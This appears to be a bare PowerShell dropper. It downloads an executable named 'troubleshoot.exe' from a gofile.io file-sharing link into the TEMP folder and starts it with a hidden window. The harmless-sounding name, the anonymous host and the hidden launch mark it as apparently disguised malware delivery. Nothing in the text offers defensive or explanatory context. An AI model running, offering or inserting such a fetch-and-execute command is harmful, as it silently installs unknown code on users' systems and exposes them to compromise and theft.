Invoke-WebRequest -Uri "https://store-eu-par-1.gofile.io/download/web/ad193c16-29eb-4fde-bbed-cc7898a7166a/troubleshoot.exe" -OutFile "$env:TEMP\troubleshoot.exe"

Start-Process -FilePath "$env:TEMP\troubleshoot.exe" -WindowStyle Hidden
